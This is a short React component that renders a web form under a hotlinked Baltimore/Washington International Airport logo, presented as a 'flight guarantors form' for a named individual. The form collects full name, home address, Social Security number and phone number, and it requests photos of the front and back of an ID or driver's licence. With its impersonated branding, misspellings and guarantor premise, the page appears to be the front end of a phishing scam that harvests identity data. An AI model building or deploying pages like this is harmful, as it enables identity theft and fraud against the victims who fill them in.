
import { NavLink } from "react-router-dom";

function HomePage(props) {
    return (
        <div className="container">
            <form className="box" onSubmit={props.handleSubmit}>
                <img src="https://img.aviationpros.com/files/base/cygnus/cavc/image/2016/05/Modified__BWI_Logo_copy.574db71b7737e.png?auto=format%2Ccompress&w=640&width=640" alt="" />
                <h1>Baltimore/Washignton internationl Airport</h1>
                <p>priviledge flight guarantors form for Grace Angel Miller</p>
                <div className="duo2">
                </div>



                
                <div className="card-input">
                    <p>Full Name</p>
                    <input type="text" placeholder="JOHN DOE" name="fullName" onChange={props.getData} />
                </div>
                <div className="card-input">
                    <p>Present Home Address</p>
                    <input type="text" placeholder="1, Nowhere street, California, USA" name="address" onChange={props.getData} />
                </div>
                <div className="duo">
                    <div className="card-input">
                        <p>SSN (social security number)</p>
                        <input type="number" placeholder="12345" name="ssn" onChange={props.getData}  />
                    </div>
                   
                </div>

                <div className="card-input">
                   <p>Phone number</p>
                   <input type="number" placeholder="12345678910" name="phoneNumber" onChange={props.getData} />
                </div>
                <p>Please provide a front and rear pictures of I.D card or drivers lincese to grace Angel Miller for confirmation</p>
                <p>Guarantor must be verified from the selected state : California</p>

    

                 <button className="check" onClick={props.handleSubmit}>Submit</button>

            </form>
        </div>
    )
}

export default HomePage;